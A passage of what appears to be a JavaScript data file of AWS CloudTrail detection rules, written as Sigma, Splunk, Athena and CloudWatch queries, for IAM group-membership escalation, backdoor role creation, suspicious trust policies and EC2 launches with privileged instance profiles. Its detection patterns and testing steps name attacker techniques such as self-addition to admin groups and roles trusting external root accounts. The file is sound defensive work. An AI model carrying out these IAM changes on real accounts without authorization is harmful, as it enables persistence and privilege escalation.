    requestParameters.groupName|contains:
      - 'Admin'
      - 'Administrators'
      - 'PowerUser'
      - 'BreakGlass'
      - 'SecurityAdmin'
      - 'PlatformAdmin'
  condition: selection and filter_privileged
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=AddUserToGroup
| where like(requestParameters.groupName, "%Admin%") OR like(requestParameters.groupName, "%PowerUser%") OR like(requestParameters.groupName, "%BreakGlass%") OR like(requestParameters.groupName, "%SecurityAdmin%") OR like(requestParameters.groupName, "%PlatformAdmin%") OR like(requestParameters.groupName, "%Administrators%")
| table _time, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'AddUserToGroup'
  AND (requestParameters.groupName LIKE '%Admin%' OR requestParameters.groupName LIKE '%PowerUser%' OR requestParameters.groupName LIKE '%BreakGlass%' OR requestParameters.groupName LIKE '%SecurityAdmin%' OR requestParameters.groupName LIKE '%PlatformAdmin%' OR requestParameters.groupName LIKE '%Administrators%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "AddUserToGroup"
| filter requestParameters.groupName like /Admin|PowerUser|BreakGlass|SecurityAdmin|PlatformAdmin|Administrators/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["AddUserToGroup"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.groupName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "AddUserToGroup", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { groupName: "AdminGroup", userName: "compromised-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the group and its attached policies.", "Verify if the user addition was authorized.", "Check for self-addition (actor = added user)."],
    testingSteps: ["Add a user to a group with Admin in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-058",
    title: "Self-Addition or Backdoor Addition to Group",
    description: "Detects likely malicious group membership when the actor adds themselves, or adds a suspiciously named user (backup, svc, admin2, support-temp, breakglass2, automation-backup).",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "AddUserToGroup", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Expected identity provisioning patterns"],
    rules: {
      sigma: `title: Self-Addition or Backdoor Addition to Group
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: AddUserToGroup
  filter_suspicious_target:
    requestParameters.userName|contains:
      - 'backup'
      - 'svc'
      - 'admin2'
      - 'support-temp'
      - 'breakglass2'
      - 'automation-backup'
  condition: selection and filter_suspicious_target
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=AddUserToGroup
| eval actor_user=replace(userIdentity.arn, ".*user/", "")
| where like(requestParameters.userName, "%backup%") OR like(requestParameters.userName, "%svc%") OR like(requestParameters.userName, "%admin2%") OR like(requestParameters.userName, "%support-temp%") OR like(requestParameters.userName, "%breakglass2%") OR like(requestParameters.userName, "%automation-backup%") OR (actor_user=requestParameters.userName)
| table _time, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'AddUserToGroup'
  AND (requestParameters.userName LIKE '%backup%' OR requestParameters.userName LIKE '%svc%' OR requestParameters.userName LIKE '%admin2%' OR requestParameters.userName LIKE '%support-temp%' OR requestParameters.userName LIKE '%breakglass2%' OR requestParameters.userName LIKE '%automation-backup%'
    OR regexp_extract(userIdentity.arn, 'user/([^/]+)$', 1) = requestParameters.userName)
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "AddUserToGroup"
| filter requestParameters.userName like /backup|svc|admin2|support-temp|breakglass2|automation-backup/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["AddUserToGroup"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.groupName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "AddUserToGroup", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { groupName: "AdminGroup", userName: "attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Check if actor added themselves (self-addition).", "Verify if target username matches backdoor patterns.", "Review when the target user was created."],
    testingSteps: ["Add yourself to a group or add a user with 'backup' in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-059",
    title: "AddUserToGroup Followed by Privileged Use",
    description: "High-confidence escalation: AddUserToGroup then within 15 minutes the added user performs CreateAccessKey, AssumeRole, ConsoleLogin, GetSecretValue, s3:GetObject, AttachUserPolicy, PutUserPolicy.",
    awsService: "IAM",
    relatedServices: ["STS", "Secrets Manager", "S3"],
    severity: "Critical",
    tags: ["IAM", "AddUserToGroup", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate onboarding followed by normal first-use activity"],
    rules: {
      sigma: `title: AddUserToGroup Followed by Privileged Use
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_add:
    eventSource: iam.amazonaws.com
    eventName: AddUserToGroup
  selection_sensitive:
    eventName:
      - CreateAccessKey
      - AssumeRole
      - GetSecretValue
      - AttachUserPolicy
      - PutUserPolicy
  condition: 1 of selection_*
level: critical
# Full correlation (added user, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND eventName=AddUserToGroup) OR (eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=GetSecretValue OR eventName=AttachUserPolicy OR eventName=PutUserPolicy))
| eval target_user=case(eventName="AddUserToGroup", requestParameters.userName, eventName=CreateAccessKey, requestParameters.userName, eventName=AttachUserPolicy, requestParameters.userName, eventName=PutUserPolicy, requestParameters.userName, 1=1, replace(userIdentity.arn, ".*user/", ""))
| eval is_add=if(eventName="AddUserToGroup", 1, 0)
| eval is_sensitive=if(eventName IN ("CreateAccessKey","AssumeRole","GetSecretValue","AttachUserPolicy","PutUserPolicy"), 1, 0)
| transaction target_user maxspan=15m
| where mvcount(mvfilter(is_add=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, target_user, eventName, userIdentity.arn`,
      cloudtrail: `WITH add_event AS (
  SELECT requestParameters.userName AS target_user, eventTime AS add_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'AddUserToGroup'
),
sensitive_use AS (
  SELECT regexp_extract(userIdentity.arn, 'user/([^/]+)$', 1) AS target_user, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('CreateAccessKey', 'AssumeRole', 'GetSecretValue', 'AttachUserPolicy', 'PutUserPolicy')
)
SELECT a.target_user, a.add_time, s.use_time, s.eventName
FROM add_event a
JOIN sensitive_use s ON a.target_user = s.target_user
  AND s.use_time > a.add_time
  AND s.use_time <= a.add_time + INTERVAL '15' MINUTE
ORDER BY a.add_time DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.userName, userIdentity.arn
| filter (eventSource = "iam.amazonaws.com" and eventName = "AddUserToGroup")
  or eventName in ["CreateAccessKey", "AssumeRole", "GetSecretValue", "AttachUserPolicy", "PutUserPolicy"]
| parse userIdentity.arn "*user/%{target_user}"
| eval target_user=coalesce(requestParameters.userName, target_user)
| stats count(*) as cnt, collect_list(eventName) as events by target_user
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["AddUserToGroup"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.groupName", "requestParameters.userName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "AddUserToGroup", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { groupName: "AdminGroup", userName: "compromised-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the added user.", "Review activity by that user within 15 minutes.", "Verify if CreateAccessKey, AssumeRole, or other sensitive actions were expected."],
    testingSteps: ["Add user to group, then as that user call CreateAccessKey within 15 min.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- IAM Backdoor Role Creation ---
  {
    id: "det-060",
    title: "IAM Role Created",
    description: "Baseline visibility for new IAM role creation. Role creation is often legitimate but security-sensitive because the trust policy defines who can assume it.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "CreateRole", "Persistence"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate role creation", "Terraform/CloudFormation"],
    rules: {
      sigma: `title: IAM Role Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateRole
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateRole
| table _time, userIdentity.arn, eventName, requestParameters.roleName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateRole'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateRole"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.assumeRolePolicyDocument", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateRole", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "BackdoorRole", assumeRolePolicyDocument: "{}" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the role.", "Inspect the trust policy (assumeRolePolicyDocument).", "Verify if the role creation was authorized."],
    testingSteps: ["Call CreateRole.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-061",
    title: "Suspicious Trust Policy on Role Creation",
    description: "Detects likely persistence or backdoor setup through dangerous trust policies. Flags trust policies allowing root of another account, external principals, or broad trust. Excludes expected service principals (ec2.amazonaws.com, ecs-tasks.amazonaws.com, lambda.amazonaws.com) when role name and actor are consistent with normal provisioning.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "CreateRole", "Persistence"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate cross-account role", "Service-linked role creation"],
    rules: {
      sigma: `title: Suspicious Trust Policy on Role Creation
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateRole
  filter_suspicious:
    requestParameters.assumeRolePolicyDocument|contains:
      - '"AWS":"arn:aws:iam::'
      - 'root'
      - ':root"'
      - 'Principal'
  condition: selection and filter_suspicious
level: high
# Refine: exclude ec2.amazonaws.com, lambda.amazonaws.com when role name matches.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateRole
| where (like(requestParameters.assumeRolePolicyDocument, "%root%") OR like(requestParameters.assumeRolePolicyDocument, "%:root%") OR like(requestParameters.assumeRolePolicyDocument, "%arn:aws:iam::%"))
  AND NOT (like(requestParameters.assumeRolePolicyDocument, "%ec2.amazonaws.com%") AND like(requestParameters.roleName, "%ec2%"))
  AND NOT (like(requestParameters.assumeRolePolicyDocument, "%lambda.amazonaws.com%") AND like(requestParameters.roleName, "%lambda%"))
| table _time, userIdentity.arn, eventName, requestParameters.roleName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.assumeRolePolicyDocument
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateRole'
  AND (requestParameters.assumeRolePolicyDocument LIKE '%root%' OR requestParameters.assumeRolePolicyDocument LIKE '%arn:aws:iam::%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.assumeRolePolicyDocument
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateRole"
| filter requestParameters.assumeRolePolicyDocument like /root|arn:aws:iam:/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.assumeRolePolicyDocument", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateRole", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "BackdoorRole", assumeRolePolicyDocument: '{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}' }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Inspect the trust policy for external or root principals.", "Verify if cross-account trust was authorized.", "Check for overly broad trust conditions."],
    testingSteps: ["Create a role with root trust policy.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-062",
    title: "New Role Immediately Granted Privileged Policy",
    description: "Correlates CreateRole with AttachRolePolicy or PutRolePolicy shortly after. Flags AdministratorAccess, PowerUserAccess, or inline policies with Action *, iam:*, sts:AssumeRole, iam:PassRole, kms:Decrypt, secretsmanager:GetSecretValue.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Critical",
    tags: ["IAM", "CreateRole", "Persistence", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate role creation with appropriate policies"],
    rules: {
      sigma: `title: New Role Immediately Granted Privileged Policy
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: iam.amazonaws.com
    eventName: CreateRole
  selection_attach:
    eventSource: iam.amazonaws.com
    eventName:
      - AttachRolePolicy
      - PutRolePolicy
  condition: 1 of selection_*
level: critical
# Full correlation (same role, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com
  (eventName=CreateRole OR eventName=AttachRolePolicy OR eventName=PutRolePolicy)
| eval role_name=case(eventName="CreateRole", requestParameters.roleName, eventName=AttachRolePolicy, requestParameters.roleName, eventName=PutRolePolicy, requestParameters.roleName, 1=1, null)
| eval is_create=if(eventName="CreateRole", 1, 0)
| eval is_privileged=if((eventName="AttachRolePolicy" AND (like(requestParameters.policyArn, "%AdministratorAccess%") OR like(requestParameters.policyArn, "%PowerUserAccess%"))) OR (eventName="PutRolePolicy" AND like(requestParameters.policyDocument, "%*%")), 1, 0)
| transaction role_name maxspan=15m
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_privileged=1))>0
| table _time, role_name, eventName, requestParameters.policyArn`,
      cloudtrail: `WITH role_created AS (
  SELECT requestParameters.roleName AS role_name, eventTime AS create_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'CreateRole'
),
policy_attached AS (
  SELECT requestParameters.roleName AS role_name, eventTime AS attach_time, eventName, requestParameters.policyArn, requestParameters.policyDocument
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName IN ('AttachRolePolicy', 'PutRolePolicy')
    AND (requestParameters.policyArn LIKE '%AdministratorAccess%' OR requestParameters.policyArn LIKE '%PowerUserAccess%' OR requestParameters.policyDocument LIKE '%*%')
)
SELECT r.role_name, r.create_time, p.attach_time, p.eventName, p.policyArn
FROM role_created r
JOIN policy_attached p ON r.role_name = p.role_name
  AND p.attach_time > r.create_time
  AND p.attach_time <= r.create_time + INTERVAL '15' MINUTE
ORDER BY r.create_time DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.roleName, requestParameters.policyArn, requestParameters.policyDocument
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["CreateRole", "AttachRolePolicy", "PutRolePolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by requestParameters.roleName
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateRole", "AttachRolePolicy", "PutRolePolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.policyArn", "requestParameters.policyDocument", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateRole", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "BackdoorRole" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the role and policies attached.", "Review the sequence: CreateRole → AttachRolePolicy/PutRolePolicy within 15 min.", "Verify if AdministratorAccess or PowerUserAccess was authorized."],
    testingSteps: ["Create a role, then attach AdministratorAccess within 15 min.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },
  {
    id: "det-063",
    title: "Suspicious Role Creation by Unexpected Actor",
    description: "Detects role creation by identities that should not manage IAM roles. Suspicious actors include IAM users, application roles, EC2 instance roles, and non-admin assumed roles. Excludes Terraform, CloudFormation, and admin roles.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "CreateRole", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Suspicious Role Creation by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateRole
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateRole
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateRole'
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateRole"
| filter userIdentity.principalId not like /terraform|cloudformation|admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.roleName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateRole", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { roleName: "BackdoorRole" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to create IAM roles.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, call CreateRole.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-064",
    title: "New Role Created Then Assumed",
    description: "High-confidence persistence: CreateRole (optionally with AttachRolePolicy/PutRolePolicy) then AssumeRole on that role shortly afterward. Catches the common create-backdoor-role-then-use-it pattern.",
    awsService: "IAM",
    relatedServices: ["STS"],
    severity: "Critical",
    tags: ["IAM", "CreateRole", "Persistence", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate role creation and immediate testing"],
    rules: {
      sigma: `title: New Role Created Then Assumed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: iam.amazonaws.com
    eventName: CreateRole
  selection_assume:
    eventName: AssumeRole
  condition: 1 of selection_*
level: critical
# Full correlation (same role ARN assumed) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND eventName=CreateRole) OR (eventSource=sts.amazonaws.com AND eventName=AssumeRole))
| eval role_name=case(eventName="CreateRole", requestParameters.roleName, eventName="AssumeRole", replace(requestParameters.roleArn, ".*role/", ""), 1=1, null)
| eval is_create=if(eventName="CreateRole", 1, 0)
| eval is_assume=if(eventName="AssumeRole", 1, 0)
| transaction role_name maxspan=30m
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_assume=1))>0
| table _time, role_name, eventName, userIdentity.arn`,
      cloudtrail: `WITH role_created AS (
  SELECT requestParameters.roleName AS role_name, eventTime AS create_time, awsregion, recipientaccountid
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'CreateRole'
),
role_assumed AS (
  SELECT requestParameters.roleArn, regexp_extract(requestParameters.roleArn, 'role/([^/]+)$', 1) AS role_name, eventTime AS assume_time
  FROM cloudtrail_logs
  WHERE eventSource = 'sts.amazonaws.com'
    AND eventName = 'AssumeRole'
)
SELECT r.role_name, r.create_time, a.assume_time
FROM role_created r
JOIN role_assumed a ON r.role_name = a.role_name
  AND a.assume_time > r.create_time
  AND a.assume_time <= r.create_time + INTERVAL '30' MINUTE
ORDER BY r.create_time DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.roleName, requestParameters.roleArn
| filter (eventSource = "iam.amazonaws.com" and eventName = "CreateRole")
  or (eventSource = "sts.amazonaws.com" and eventName = "AssumeRole")
| eval role_key=coalesce(requestParameters.roleName, replace(requestParameters.roleArn, ".*role/", ""))
| stats count(*) as cnt, collect_list(eventName) as events by role_key
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam", "aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateRole", "AssumeRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.roleArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateRole", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "BackdoorRole" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the role that was created.", "Review AssumeRole events for that role within 30 minutes.", "Verify if the assumption was authorized."],
    testingSteps: ["Create a role, attach policy, then AssumeRole within 30 min.", "Verify all events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- PassRole via EC2 RunInstances (detect via EC2, NOT iam:PassRole) ---
  {
    id: "det-065",
    title: "EC2 Launched with IAM Instance Profile",
    description: "Baseline visibility for instances launched with an IAM profile. Normal in many environments but important because roles on compute are a major privilege surface. Detects RunInstances with iamInstanceProfile in requestParameters.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["EC2", "RunInstances", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate EC2 launches with instance profiles", "Auto Scaling"],
    rules: {
      sigma: `title: EC2 Launched with IAM Instance Profile
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
  filter_profile:
    requestParameters.iamInstanceProfile|exists: true
  condition: selection and filter_profile
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=RunInstances
| where isnotnull(requestParameters.iamInstanceProfile)
| table _time, userIdentity.arn, eventName, requestParameters.iamInstanceProfile, requestParameters.instancesSet, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.iamInstanceProfile, requestParameters.instancesSet, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'RunInstances'
  AND requestParameters.iamInstanceProfile IS NOT NULL
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.iamInstanceProfile, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "RunInstances"
| filter ispresent(requestParameters.iamInstanceProfile)
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunInstances"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.iamInstanceProfile", "requestParameters.instancesSet", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { iamInstanceProfile: { name: "AdminInstanceProfile" }, instancesSet: { items: [{ imageId: "ami-xxx", instanceType: "t2.micro" }] } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who launched the instance.", "Inspect the instance profile name/ARN.", "Verify if the launch was authorized."],
    testingSteps: ["Launch EC2 with iam-instance-profile.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-066",
    title: "RunInstances with High-Risk Instance Profile",
    description: "Detects likely privilege escalation when the attached instance profile is privileged. Matches Admin, Administrator, PowerUser, Security, BreakGlass patterns in profile name or ARN.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EC2", "RunInstances", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known baseline infrastructure roles", "Approved launch pipelines"],
    rules: {
      sigma: `title: RunInstances with High-Risk Instance Profile
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
  filter_name:
    requestParameters.iamInstanceProfile|contains:
      - 'Admin'
      - 'Administrator'
      - 'PowerUser'
      - 'Security'
